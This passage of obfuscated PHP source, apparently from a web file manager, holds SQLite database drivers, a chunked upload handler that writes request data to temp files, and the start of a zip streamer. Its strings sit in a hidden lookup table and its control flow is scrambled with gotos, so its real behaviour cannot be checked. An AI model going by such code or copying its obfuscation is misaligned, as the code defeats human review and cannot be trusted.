think_status($Eì±‚Á¡®Ä[20]); $this->queryID = sqlite_query($this->_linkID, $E°«ÊÄÃÆÏ); $this->debug(); goto Bè½¨Ÿ›…ô; D•ˆÀ¨éôß: $Eì±‚Á¡®Ä =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A‚¾Û…×ï“; Bè½¨Ÿ›…ô: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $aÂ´³­Ó¨¾ = $this->getAll(); return $aÂ´³­Ó¨¾; } goto e˜¤İŸß„À; e˜¤İŸß„À: } public function execute($dğ‚ÈæÑÜ) { goto a²ãà‚¶±µ; fààØ¿İÉ: $this->queryStr = $dğ‚ÈæÑÜ; if ($this->queryID) { $this->free(); } think_action_status($Aòˆè§Ü—˜[21], 1); goto A† £æê´†; AÒ‚Ïä©‡¶: if (!1 === $E±Ù£é°‘™) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto A½ºšê¢³†; A† £æê´†: think_status($Aòˆè§Ü—˜[20]); $E±Ù£é°‘™ = sqlite_exec($this->_linkID, $dğ‚ÈæÑÜ); $this->debug(); goto AÒ‚Ïä©‡¶; a²ãà‚¶±µ: $Aòˆè§Ü—˜ =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fààØ¿İÉ; A½ºšê¢³†: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ä¿Ş°¨][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aë°İó†Ù„ = sqlite_query($this->_linkID, $_SERVER[Ä¿Ş°¨][23]); if (!$aë°İó†Ù„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $b¡²‰¾÷­ = sqlite_query($this->_linkID, $_SERVER[Ä¿Ş°¨][24]); if (!$b¡²‰¾÷­) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fßß¹ì—ã… = array(); if ($this->numRows > 0) { for ($AÁÖ£Ú¢…ë = 0; $AÁÖ£Ú¢…ë < $this->numRows; $AÁÖ£Ú¢…ë++) { $fßß¹ì—ã…[$AÁÖ£Ú¢…ë] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $fßß¹ì—ã…; } public function getFields($F‚ÇÁµĞ¼«) { $aôË²µÛß  =& $_SERVER[Ä¿Ş°¨]; $b»´÷ŒùÜ¥ = $this->query($aôË²µÛß [25] . $F‚ÇÁµĞ¼« . $aôË²µÛß [26]); $bÍ±¬õâ = array(); if ($b»´÷ŒùÜ¥) { foreach ($b»´÷ŒùÜ¥ as $càÃëñƒ•Û => $a©ìŒ«¼²Î) { $bÍ±¬õâ[$a©ìŒ«¼²Î[$aôË²µÛß [27]]] = array($aôË²µÛß [28] => $a©ìŒ«¼²Î[$aôË²µÛß [27]], $aôË²µÛß [29] => $a©ìŒ«¼²Î[$aôË²µÛß [30]], $aôË²µÛß [31] => (bool) ($a©ìŒ«¼²Î[$aôË²µÛß [32]] === $aôË²µÛß [33]), $aôË²µÛß [34] => $a©ìŒ«¼²Î[$aôË²µÛß [35]], $aôË²µÛß [36] => strtolower($a©ìŒ«¼²Î[$aôË²µÛß [37]]) == $aôË²µÛß [38], $aôË²µÛß [39] => strtolower($a©ìŒ«¼²Î[$aôË²µÛß [40]]) == $aôË²µÛß [41]); } } return $bÍ±¬õâ; } public function getTables($fö‘¼õŞäŸ = '') { $fÔ†Áë«¶È =& $_SERVER[Ä¿Ş°¨]; $D‰ŒÍÅ„‡ = $this->query($fÔ†Áë«¶È[42] . $fÔ†Áë«¶È[43] . $fÔ†Áë«¶È[44]); $AŠ¦éÅë÷ = array(); foreach ($D‰ŒÍÅ„‡ as $B†–˜—å… => $D¯®ªš•Æù) { $AŠ¦éÅë÷[$B†–˜—å…] = current($D¯®ªš•Æù); } return $AŠ¦éÅë÷; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $c¢‰…ØÉÏå =& $_SERVER[Ä¿Ş°¨]; $cß°©İçË´ = sqlite_last_error($this->_linkID); $this->error = $cß°©İçË´ . $c¢‰…ØÉÏå[4] . sqlite_error_string($cß°©İçË´); if ($c¢‰…ØÉÏå[33] != $this->queryStr) { $this->error .= LNG($c¢‰…ØÉÏå[45]) . $this->queryStr; } think_trace($this->error, $c¢‰…ØÉÏå[33], $c¢‰…ØÉÏå[46]); return $this->error; } public function escapeString($eËñ†öÓºÄ) { return sqlite_escape_string($eËñ†öÓºÄ); } public function parseLimit($FÙÅ–Á‰‘‰) { $d½¹É­ö”ì =& $_SERVER[Ä¿Ş°¨]; $F®éŒˆ‘– = $d½¹É­ö”ì[33]; if (!empty($FÙÅ–Á‰‘‰)) { $FÙÅ–Á‰‘‰ = explode($d½¹É­ö”ì[47], $FÙÅ–Á‰‘‰); if (count($FÙÅ–Á‰‘‰) > 1) { $F®éŒˆ‘– .= $d½¹É­ö”ì[48] . $FÙÅ–Á‰‘‰[1] . $d½¹É­ö”ì[49] . $FÙÅ–Á‰‘‰[0] . $d½¹É­ö”ì[50]; } else { $F®éŒˆ‘– .= $d½¹É­ö”ì[48] . $FÙÅ–Á‰‘‰[0] . $d½¹É­ö”ì[50]; } } return $F®éŒˆ‘–; } } class DbSqlite3Base extends Db { public function __construct($EáÇ‹Æé–ƒ = '') { $eö„ä…¸ƒ =& $_SERVER[Ä¿Ş°¨]; if (!class_exists($eö„ä…¸ƒ[51])) { think_exception(think_lang($eö„ä…¸ƒ[10]) . $eö„ä…¸ƒ[52]); } if (!empty($EáÇ‹Æé–ƒ)) { if (!isset($EáÇ‹Æé–ƒ[$eö„ä…¸ƒ[12]])) { $EáÇ‹Æé–ƒ[$eö„ä…¸ƒ[12]] = 438; } $this->config = $EáÇ‹Æé–ƒ; if (empty($this->config[$eö„ä…¸ƒ[13]])) { $this->config[$eö„ä…¸ƒ[13]] = array(); } } } public function connect($Fç—ôêÊ‹¶ = '', $EÂ±›¢Ä‘„ = 0) { $eçˆÃõ½…‹ =& $_SERVER[Ä¿Ş°¨]; if (!isset($this->linkID[$EÂ±›¢Ä‘„])) { if (empty($Fç—ôêÊ‹¶)) { $Fç—ôêÊ‹¶ = $this->config; } $this->linkID[$EÂ±›¢Ä‘„] = new SQLite3($Fç—ôêÊ‹¶[$eçˆÃõ½…‹[17]]); if (!$this->linkID[$EÂ±›¢Ä‘„]) { think_exception($this->linkID[$EÂ±›¢Ä‘„]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$EÂ±›¢Ä‘„]->busyTimeout(30000); if (1 != think_config($eçˆÃõ½…‹[18])) { unset($this->config); } } return $this->linkID[$EÂ±›¢Ä‘„]; } public function free() { $this->queryID = null; } public function query($E‘ã¹˜˜Î¶) { goto c‚µ¿…ïŞ†; fƒ¬­Šõ‚ç: think_status($c¦íÒ°Û¿[20]); $this->queryID = $this->_linkID->query($E‘ã¹˜˜Î¶); $this->debug(); goto föÔ±™ —¯; c‚µ¿…ïŞ†: $c¦íÒ°Û¿ =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÕ‡Ä…Õ‡ğ; föÔ±™ —¯: if (!1 === $this->queryID) { $this->error(); return !1; } else { $a„š‰ôÀ±¾ = $this->getAll(); $this->numRows = count($a„š‰ôÀ±¾); return $a„š‰ôÀ±¾; } goto Eæ…‡î÷ô¦; EÕ‡Ä…Õ‡ğ: $this->queryStr = $E‘ã¹˜˜Î¶; if ($this->queryID) { $this->free(); } think_action_status($c¦íÒ°Û¿[19], 1); goto fƒ¬­Šõ‚ç; Eæ…‡î÷ô¦: } public function execute($dëíİõßŞö) { goto EóÎŞ‡Å; EóÎŞ‡Å: $aŒĞä¬ºâÏ =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F‹ù¥ˆÃµ‘; BÁ™Û¹¼§î: think_status($aŒĞä¬ºâÏ[20]); $eÏ±“Áˆ˜ = $this->_linkID->exec($dëíİõßŞö); $this->debug(); goto b‹ß®ªºƒ©; F‹ù¥ˆÃµ‘: $this->queryStr = $dëíİõßŞö; if ($this->queryID) { $this->free(); } think_action_status($aŒĞä¬ºâÏ[21], 1); goto BÁ™Û¹¼§î; b‹ß®ªºƒ©: if (!1 === $eÏ±“Áˆ˜) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto CöÕÙŒ¥Æ; CöÕÙŒ¥Æ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ä¿Ş°¨][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cÊ¬¯­ò­ğ = $this->_linkID->query($_SERVER[Ä¿Ş°¨][23]); if (!$cÊ¬¯­ò­ğ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $B‰˜‰ììÁé = $this->_linkID->query($_SERVER[Ä¿Ş°¨][24]); if (!$B‰˜‰ììÁé) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $A†¯æÜø‹Î = array(); while ($AĞÆŠĞŒ² = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $A†¯æÜø‹Î[] = $AĞÆŠĞŒ²; } $this->queryID->reset(); return $A†¯æÜø‹Î; } public function getFields($E„ÍêÉ¡’ñ) { $C¨ùÓÌ¦ç =& $_SERVER[Ä¿Ş°¨]; $F™…³£åÁ = $this->query($C¨ùÓÌ¦ç[25] . $E„ÍêÉ¡’ñ . $C¨ùÓÌ¦ç[26]); $EÍßÎĞØ¸¢ = array(); if ($F™…³£åÁ) { foreach ($F™…³£åÁ as $BÆÕÚ•ò¼® => $Eª˜ÓŸì†‰) { $EÍßÎĞØ¸¢[$Eª˜ÓŸì†‰[$C¨ùÓÌ¦ç[28]]] = array($C¨ùÓÌ¦ç[28] => $Eª˜ÓŸì†‰[$C¨ùÓÌ¦ç[28]], $C¨ùÓÌ¦ç[29] => $Eª˜ÓŸì†‰[$C¨ùÓÌ¦ç[29]], $C¨ùÓÌ¦ç[31] => (bool) ($Eª˜ÓŸì†‰[$C¨ùÓÌ¦ç[31]] === $C¨ùÓÌ¦ç[33]), $C¨ùÓÌ¦ç[34] => $Eª˜ÓŸì†‰[$C¨ùÓÌ¦ç[53]], $C¨ùÓÌ¦ç[36] => (bool) $Eª˜ÓŸì†‰[$C¨ùÓÌ¦ç[54]], $C¨ùÓÌ¦ç[39] => (bool) $Eª˜ÓŸì†‰[$C¨ùÓÌ¦ç[54]]); } } return $EÍßÎĞØ¸¢; } public function getTables($AáÍ—˜¹Ö… = '') { $DÚ¾„¡”Ä =& $_SERVER[Ä¿Ş°¨]; $AáË¾Éõà¦ = $this->query($DÚ¾„¡”Ä[42] . $DÚ¾„¡”Ä[43] . $DÚ¾„¡”Ä[44]); $aíÔŠ£ñÓÁ = array(); foreach ($AáË¾Éõà¦ as $d“ğ¥†Üä => $bÜ¸é™Ä­) { $aíÔŠ£ñÓÁ[$d“ğ¥†Üä] = current($bÜ¸é™Ä­); } return $aíÔŠ£ñÓÁ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $FÊÑ¨¦áÑ =& $_SERVER[Ä¿Ş°¨]; $this->error = $this->_linkID->lastErrorMsg(); if ($FÊÑ¨¦áÑ[33] != $this->queryStr) { $this->error .= LNG($FÊÑ¨¦áÑ[45]) . $this->queryStr; } think_trace($this->error, $FÊÑ¨¦áÑ[33], $FÊÑ¨¦áÑ[46]); return $this->error; } public function escapeString($aŞ…´¤× ¶) { $F‚×ŒÛêã =& $_SERVER[Ä¿Ş°¨]; if ($this->_linkID) { return $this->_linkID->escapeString($aŞ…´¤× ¶); } return str_ireplace($F‚×ŒÛêã[55], $F‚×ŒÛêã[56], $aŞ…´¤× ¶); } public function parseLimit($dÛ…ÓÒ‚®Ÿ) { $cÌÙïºæÈ» =& $_SERVER[Ä¿Ş°¨]; $c²˜§‡Ê‡ = $cÌÙïºæÈ»[33]; if (!empty($dÛ…ÓÒ‚®Ÿ)) { $dÛ…ÓÒ‚®Ÿ = explode($cÌÙïºæÈ»[47], $dÛ…ÓÒ‚®Ÿ); if (count($dÛ…ÓÒ‚®Ÿ) > 1) { $c²˜§‡Ê‡ .= $cÌÙïºæÈ»[48] . $dÛ…ÓÒ‚®Ÿ[1] . $cÌÙïºæÈ»[49] . $dÛ…ÓÒ‚®Ÿ[0] . $cÌÙïºæÈ»[50]; } else { $c²˜§‡Ê‡ .= $cÌÙïºæÈ»[48] . $dÛ…ÓÒ‚®Ÿ[0] . $cÌÙïºæÈ»[50]; } } return $c²˜§‡Ê‡; } } goto Cæ¬ã„¢; a´ê‡®ËÖœ: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto Eâî‡Ç­Ö; Dèõà‡±˜ä: $this->checkSize(); $this->tempPathInit(); goto f¸»•Š™; Fµ×È­…ÜŒ: if (!empty($_FILES)) { $bêœÂí›ö = $_FILES[$BÆîÆ¸î·Ï[163]]; $this->uploadFile = $bêœÂí›ö[$BÆîÆ¸î·Ï[1926]]; if (!$this->uploadFile && $bêœÂí›ö[$BÆîÆ¸î·Ï[1196]] > 0) { show_json($this->errorInfo($bêœÂí›ö[$BÆîÆ¸î·Ï[1196]]), !1); } } else { if (isset($in[$BÆîÆ¸î·Ï[391]])) { $this->uploadFile = isset($in[$BÆîÆ¸î·Ï[1927]]) ? $BÆîÆ¸î·Ï[1928] : $BÆîÆ¸î·Ï[1773]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Dèõà‡±˜ä; Eâî‡Ç­Ö: $BÆîÆ¸î·Ï =& $_SERVER[Ä¿Ş°¨]; global $in; $this->in =& $in; goto Fµ×È­…ÜŒ; f¸»•Š™: } public function upload() { goto EâğÔÅº¶; bòá…ÏÍ–: CacheLock::lock($this->tempFile, 20); $fñƒ™š„Š” = $this->statusGet(); $this->initFileTemp(); goto BŠ¡Á°¯‡; eŠí¬Æ‰¸: $f¡ÉéË…‡ƒ = $this->tempFile . $Eœß»°†œˆ[1931] . $dëóÌ¦¿õ; $fêÌæ³°ÖÉ = isset($this->in[$Eœß»°†œˆ[524]]) ? intval($this->in[$Eœß»°†œˆ[524]]) : 0; $D£Şºğ™ï = isset($this->in[$Eœß»°†œˆ[1932]]) ? intval($this->in[$Eœß»°†œˆ[1932]]) : 0; goto Cæ•ùã›ö”; d«‘‘ö…‡: CacheLock::unlock($this->tempFile); return $this->tempFile; goto bÇíÌ‚ë—ß; Cß…¥òŸŒ: $f°«‡¸ˆß = $this->writeTo($a£±Åã½ğ, $BË’Ö©ù¾, $this->tempFile); $e÷»ŸÌ¦„ = IO::hashSimple($a£±Åã½ğ); $fêÌæ³°ÖÉ = IO::size($a£±Åã½ğ); goto DïĞÆÍìè; bÕÀôğŠª: ignore_timeout(); if (!$this->checkChunkHash($fñƒ™š„Š”)) { $this->showJson($Eœß»°†œˆ[1943], !1); } $this->statusSet(!1); goto d«‘‘ö…‡; Cæ•ùã›ö”: if ($AôÕ¬¡Åù > 1 && $D£Şºğ™ï <= 0) { show_json($Eœß»°†œˆ[1933], !1); } if ($D£Şºğ™ï > $fêÌæ³°ÖÉ) { $AôÕ¬¡Åù = 1; } if ($AôÕ¬¡Åù <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto bòá…ÏÍ–; f­êÜ‘¦Ãè: $fñƒ™š„Š”[$Eœß»°†œˆ[1939]][$Eœß»°†œˆ[1940] . $dëóÌ¦¿õ] = array($Eœß»°†œˆ[1941] => $EÛÒ®õ±ó’, $Eœß»°†œˆ[1021] => $dëóÌ¦¿õ, $Eœß»°†œˆ[77] => $fêÌæ³°ÖÉ, $Eœß»°†œˆ[160] => $e÷»ŸÌ¦„); $this->statusSet($fñƒ™š„Š”); if (count($fñƒ™š„Š”[$Eœß»°†œˆ[1939]]) != $fñƒ™š„Š”[$Eœß»°†œˆ[1938]]) { $this->showJson($Eœß»°†œˆ[1942] . $dëóÌ¦¿õ, !0); } goto bÕÀôğŠª; EâğÔÅº¶: $Eœß»°†œˆ =& $_SERVER[Ä¿Ş°¨]; $dëóÌ¦¿õ = isset($this->in[$Eœß»°†œˆ[1929]]) ? intval($this->in[$Eœß»°†œˆ[1929]]) : 0; $AôÕ¬¡Åù = isset($this->in[$Eœß»°†œˆ[1930]]) ? intval($this->in[$Eœß»°†œˆ[1930]]) : 1; goto eŠí¬Æ‰¸; BŠ¡Á°¯‡: $a£±Åã½ğ = $this->moveUploadedFile($f¡ÉéË…‡ƒ); if ($fêÌæ³°ÖÉ > 0 && filesize($a£±Åã½ğ) == 0) { $this->showJson($Eœß»°†œˆ[1934], !1); } if (!$a£±Åã½ğ) { $this->showJson(LNG($Eœß»°†œˆ[1935]), !1); } goto F“³¸İå‘; F“³¸İå‘: $EÛÒ®õ±ó’ = $dëóÌ¦¿õ * $D£Şºğ™ï; $BË’Ö©ù¾ = @fopen($this->tempFile, $Eœß»°†œˆ[1936]); fseek($BË’Ö©ù¾, $EÛÒ®õ±ó’); goto Cß…¥òŸŒ; DïĞÆÍìè: @unlink($a£±Åã½ğ); if (!$f°«‡¸ˆß) { $this->showJson($Eœß»°†œˆ[1937] . $dëóÌ¦¿õ, !1); } $fñƒ™š„Š”[$Eœß»°†œˆ[1938]] = $AôÕ¬¡Åù; goto f­êÜ‘¦Ãè; bÇíÌ‚ë—ß: } private function checkSize() { $fôÏîğïÄ® =& $_SERVER[Ä¿Ş°¨]; if (phpBuild64() || $this->in[$fôÏîğïÄ®[77]] < PHP_INT_MAX) { return; } show_json(LNG($fôÏîğïÄ®[1944]), !1); } private function showJson($A‚Ü‚òÔ´·, $fëè¡­’ï¹) { CacheLock::unlock($this->tempFile); if (!$fëè¡­’ï¹) { return show_json($A‚Ü‚òÔ´·, $fëè¡­’ï¹); } show_json($A‚Ü‚òÔ´·, $fëè¡­’ï¹); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto eÄ‰Š¬ìóæ; eÆ†©²îˆ: $this->tempFile = $F‘¶„ÔË . $F¥²ŞÆÑÛ[1947] . md5($dè¼ÙŠñÃß . $this->in[$F¥²ŞÆÑÛ[1490]]); goto aÍç™ˆïĞÈ; eÄ‰Š¬ìóæ: $F¥²ŞÆÑÛ =& $_SERVER[Ä¿Ş°¨]; $F‘¶„ÔË = TEMP_FILES; @mk_dir($F‘¶„ÔË); goto c¨Ó¥É¾Ï; c¨Ó¥É¾Ï: touch($F‘¶„ÔË . $F¥²ŞÆÑÛ[1945]); $dè¼ÙŠñÃß = isset($this->in[$F¥²ŞÆÑÛ[1946]]) ? $this->in[$F¥²ŞÆÑÛ[1946]] : !1; if (strlen($dè¼ÙŠñÃß) < 30) { $dè¼ÙŠñÃß = md5(USER_ID . $this->in[$F¥²ŞÆÑÛ[75]] . $this->fileName . $this->in[$F¥²ŞÆÑÛ[77]]); } goto eÆ†©²îˆ; aÍç™ˆïĞÈ: } private function moveUploadedFile($Eäêæ¶ãï¾) { $E´ÖÍáÄ‘ =& $_SERVER[Ä¿Ş°¨]; $D…½‹Ï¾ÀË = $this->uploadFile; if ($D…½‹Ï¾ÀË == $E´ÖÍáÄ‘[1948]) { @file_put_contents($Eäêæ¶ãï¾, base64_decode($_REQUEST[$E´ÖÍáÄ‘[1949]])); } else { if ($D…½‹Ï¾ÀË == $E´ÖÍáÄ‘[1773]) { $aíä«†Ü¿Õ = @fopen($Eäêæ¶ãï¾, $E´ÖÍáÄ‘[1479]); $this->writeTo($D…½‹Ï¾ÀË, $aíä«†Ü¿Õ, $Eäêæ¶ãï¾); } else { if (!move_uploaded_file($D…½‹Ï¾ÀË, $Eäêæ¶ãï¾)) { return !1; } } } return $Eäêæ¶ãï¾; } private function writeTo($cŠ‰¯­İ¯ƒ, $DâŠ—½ , $dÕ¾ÔŞÏİ¾) { goto Aé´¥êÔÓÀ; dƒ¶ØÎˆ£Š: return !0; goto F™¢ êìÙ°; BŠ¹ÌöòÅ¡: $eÌ”œ»ÄÙ = @fopen($cŠ‰¯­İ¯ƒ, $aÏ‹·¹‹¡[1478]); if (!$eÌ”œ»ÄÙ || !$DâŠ—½  || !$A—èâ¨ß³ø) { CacheLock::unlock($c´Ä”ÓáóÖ); return !1; } while (!feof($eÌ”œ»ÄÙ)) { fwrite($DâŠ—½ , fread($eÌ”œ»ÄÙ, 1024 * 200)); } goto dãŠÓ¼Ì´¿; dãŠÓ¼Ì´¿: fclose($eÌ”œ»ÄÙ); fclose($DâŠ—½ ); CacheLock::unlock($c´Ä”ÓáóÖ); goto dƒ¶ØÎˆ£Š; Aé´¥êÔÓÀ: $aÏ‹·¹‹¡ =& $_SERVER[Ä¿Ş°¨]; $c´Ä”ÓáóÖ = $aÏ‹·¹‹¡[1950] . $dÕ¾ÔŞÏİ¾; $A—èâ¨ß³ø = CacheLock::lock($c´Ä”ÓáóÖ, 1); goto BŠ¹ÌöòÅ¡; F™¢ êìÙ°: } private function statusGet() { goto d…·„ß°É…; d…·„ß°É…: $DŞ¼Æõ¯«® =& $_SERVER[Ä¿Ş°¨]; if (is_array($this->statusData)) { return $this->statusData; } $f‘½Ã‹’† = $this->tempFile . $DŞ¼Æõ¯«®[1951]; goto E–ëŸ¨³ÒŸ; E–ëŸ¨³ÒŸ: $dÊéİŠ“Ê = !1; if (file_exists($f‘½Ã‹’†)) { $dÊéİŠ“Ê = @file_get_contents($f‘½Ã‹’†); } if ($dÊéİŠ“Ê) { $this->statusData = json_decode($dÊéİŠ“Ê, !0); } goto Aö‹ï²ƒº; Aö‹ï²ƒº: if (!$this->statusData) { $c£ìÜßÇ— = array($DŞ¼Æõ¯«®[28] => $this->fileName, $DŞ¼Æõ¯«®[1938] => 0, $DŞ¼Æõ¯«®[1939] => array()); $this->statusSet($c£ìÜßÇ—); } return $this->statusData; goto DêëÍÑ¨õ; DêëÍÑ¨õ: } public function statusSet($F¬‡ïÙ‡‹„) { $C„êñ¯ÁÆÅ = $this->tempFile . $_SERVER[Ä¿Ş°¨][1951]; if (!$F¬‡ïÙ‡‹„) { if (file_exists($C„êñ¯ÁÆÅ)) { @unlink($C„êñ¯ÁÆÅ); } return !0; } $this->statusData = $F¬‡ïÙ‡‹„; return file_put_contents($C„êñ¯ÁÆÅ, json_encode($F¬‡ïÙ‡‹„)); } private function initFileTemp() { $EªŞäŒ¥âƒ =& $_SERVER[Ä¿Ş°¨]; if (file_exists($this->tempFile)) { return; } $CåæŒïæÑ‡ = fopen($this->tempFile, $EªŞäŒ¥âƒ[1952]); fseek($CåæŒïæÑ‡, $this->in[$EªŞäŒ¥âƒ[77]] - 1, SEEK_SET); fwrite($CåæŒïæÑ‡, $EªŞäŒ¥âƒ[472]); fclose($CåæŒïæÑ‡); } public function checkChunk() { goto c¼ØÖâ¼ˆ÷; c¼ØÖâ¼ˆ÷: $bËâ¼ˆä =& $_SERVER[Ä¿Ş°¨]; $C‰ëì Åíæ = array(); CacheLock::lock($this->tempFile); goto AˆÆßêåŸ; AˆÆßêåŸ: $F¢¡–í†¡Œ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($F¢¡–í†¡Œ[$bËâ¼ˆä[1939]] as $FÅ›ïÇœËñ) { $aÉâ¦¼Ï¸À = $FÅ›ïÇœËñ[$bËâ¼ˆä[160]]; if ($aÉâ¦¼Ï¸À) { $C‰ëì Åíæ[$bËâ¼ˆä[1953] . $FÅ›ïÇœËñ[$bËâ¼ˆä[1021]]] = $aÉâ¦¼Ï¸À; } } goto b­ØÃÛøÃ; b­ØÃÛøÃ: return $C‰ëì Åíæ; goto fÑ˜ä²‡–—; fÑ˜ä²‡–—: } private function checkChunkHash($f´µÎä½“–) { goto béğ‚Ú˜Œ¼; Dí‹‚éŞ£Æ: $dŠƒÇ÷áô = _get($this->in, $b™”†¡¿Õä[1954]); if (strlen($dŠƒÇ÷áô) == 32 && IO::hashSimple($this->tempFile) == $fî«¸”¶¨å && IO::hashMd5($this->tempFile) == $dŠƒÇ÷áô) { return !0; } $a¨§·ß¿ÄÎ = fopen($this->tempFile, $b™”†¡¿Õä[1147]); goto A½¯»Œ§¹§; A½¯»Œ§¹§: $cóÀóÙŸÅ = !0; foreach ($f´µÎä½“–[$b™”†¡¿Õä[1939]] as $AÜôŠÑÃ¡ï) { fseek($a¨§·ß¿ÄÎ, $AÜôŠÑÃ¡ï[$b™”†¡¿Õä[1941]]); $aÒÄŠ®ÉÛŒ = PathDriverStream::hash($a¨§·ß¿ÄÎ, $AÜôŠÑÃ¡ï[$b™”†¡¿Õä[77]]); if ($AÜôŠÑÃ¡ï[$b™”†¡¿Õä[160]] != $aÒÄŠ®ÉÛŒ) { $cóÀóÙŸÅ = !1; break; } } fclose($a¨§·ß¿ÄÎ); goto AËªÓ½†‡; AËªÓ½†‡: return $cóÀóÙŸÅ; goto AÛõÁòÔÜ; béğ‚Ú˜Œ¼: $b™”†¡¿Õä =& $_SERVER[Ä¿Ş°¨]; if (count($f´µÎä½“–[$b™”†¡¿Õä[1939]]) != $f´µÎä½“–[$b™”†¡¿Õä[1938]]) { return !1; } $fî«¸”¶¨å = _get($this->in, $b™”†¡¿Õä[1946]); goto Dí‹‚éŞ£Æ; AÛõÁòÔÜ: } public static function fileName() { goto e»‹ö”˜©; cÒ£‘³‰ñØ: if (!empty($_FILES)) { $FæãùÈèËå = $FæãùÈèËå ? $FæãùÈèËå : $_FILES[$bÜ”¸‘¡À‹[163]][$bÜ”¸‘¡À‹[391]]; } $FæãùÈèËå = str_replace(array($bÜ”¸‘¡À‹[93], $bÜ”¸‘¡À‹[8]), array($bÜ”¸‘¡À‹[8], $bÜ”¸‘¡À‹[91]), trim($FæãùÈèËå)); if (!is_wap()) { return $FæãùÈèËå; } goto fÕ…¬å‰à±; fÕ…¬å‰à±: $AÄÒŒƒŒöã = strtotime($in[$bÜ”¸‘¡À‹[1955]]); $AÄÒŒƒŒöã = $AÄÒŒƒŒöã ? $AÄÒŒƒŒöã : time(); $Bª­Úä»à = strtolower($FæãùÈèËå); goto AÔ ¤ÁÚÁô; AÔ ¤ÁÚÁô: if ($Bª­Úä»à == $bÜ”¸‘¡À‹[1956] || $Bª­Úä»à == $bÜ”¸‘¡À‹[1957]) { $FæãùÈèËå = date($bÜ”¸‘¡À‹[684], $AÄÒŒƒŒöã) . $bÜ”¸‘¡À‹[70] . $in[$bÜ”¸‘¡À‹[77]] . $bÜ”¸‘¡À‹[1587]; } else { if ($Bª­Úä»à == $bÜ”¸‘¡À‹[1958]) { $FæãùÈèËå = date($bÜ”¸‘¡À‹[684], $AÄÒŒƒŒöã) . $bÜ”¸‘¡À‹[70] . $in[$bÜ”¸‘¡À‹[77]] . $bÜ”¸‘¡À‹[1959]; } } return $FæãùÈèËå; goto f×ª•Òã§Ã; e»‹ö”˜©: $bÜ”¸‘¡À‹ =& $_SERVER[Ä¿Ş°¨]; global $in; $FæãùÈèËå = isset($in[$bÜ”¸‘¡À‹[28]]) ? $in[$bÜ”¸‘¡À‹[28]] : $bÜ”¸‘¡À‹[33]; goto cÒ£‘³‰ñØ; f×ª•Òã§Ã: } private function errorInfo($d¤ÍÕ¿İö³) { $Eëñ›‰Ìè„ =& $_SERVER[Ä¿Ş°¨]; $Eª³´ªµÁ = array($Eëñ›‰Ìè„[1960], $Eëñ›‰Ìè„[1961], $Eëñ›‰Ìè„[1962], $Eëñ›‰Ìè„[1963], $Eëñ›‰Ìè„[1964], $Eëñ›‰Ìè„[1965], $Eëñ›‰Ìè„[1966], $Eëñ›‰Ìè„[1967]); return $d¤ÍÕ¿İö³ . $Eëñ›‰Ìè„[4] . $Eª³´ªµÁ[$d¤ÍÕ¿İö³]; } } class ZipMake { const VERSION = "\x30\56\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($A¡ÅñÍ’á‚ = null) { $eÕº©µÊâ™ =& $_SERVER[Ä¿Ş°¨]; $this->outputStream = fopen($eÕº©µÊâ™[1968], $eÕº©µÊâ™[1203]); $this->outputName = $A¡ÅñÍ’á‚; $this->needHeaders = !0; } public function addFile($CÉÕÚŒ¼×, $a¸Õ˜«Ú¯) { goto d°Í®ëƒÀÈ; d°Í®ëƒÀÈ: $E—òäåší± =& $_SERVER[Ä¿Ş°¨]; $CÉÕÚŒ¼× = $this->filterFilename($CÉÕÚŒ¼×); $C‚‘î¹Æ¯ = static::METHOD_STORE; goto a•ğ¼İêœ; a•ğ¼İêœ: $D¿²íİ–ƒ… = $this->addFileHeader($CÉÕÚŒ¼×, $C‚‘î¹Æ¯); $f¦µËÓ©ğ = $Cë§ÈÑ£‰Œ = filesize($a¸Õ˜«Ú¯); $e·Îò«Ê›ˆ = fopen($a¸Õ˜«Ú¯, 